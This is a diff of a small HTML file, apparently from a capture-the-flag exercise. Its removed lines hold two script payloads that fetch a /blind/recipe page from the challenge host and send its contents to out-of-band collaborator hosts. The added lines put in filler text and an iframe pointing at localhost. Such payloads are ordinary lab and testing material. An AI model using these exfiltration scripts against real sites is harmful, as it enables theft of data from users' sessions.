@@ -1,22 +1,8 @@
 <html lang="en">
     <head>
-        <script>
-                exfil = new XMLHttpRequest();
-                // Set the correct server below e.g https://abcdefg.ctfio.com
-                exfil.open("GET","https://jason.ctfio.com/blind/recipe");
-                exfil.send();
-                // put your colab instance below to you can capture the contents of /blind/recipe
-                exfil.onload = function(){ document.write('<img src="https://wlllb4fzl29wxx8vstk5sylxpovpjf74.oastify.com/?x=' + btoa(this.responseText) + '">'); }
-        </script>
-        <script>
-            fetch('https://jason.ctfio.com/blind/recipe').then((res) => {
-                res.text().then( (x) =>
-                    fetch("https://v84ky32y81wvkwvufs74fx8wcnip6hu6.oastify.com", {method: "POST", body: JSON.stringify(x)})
-                )
-            })
-        </script>
     </head>
     <body>
-        abcdefg
+        abcdefg. HIIIIII
     </body>
+    <iframe src="localhost"></iframe>
 </html>
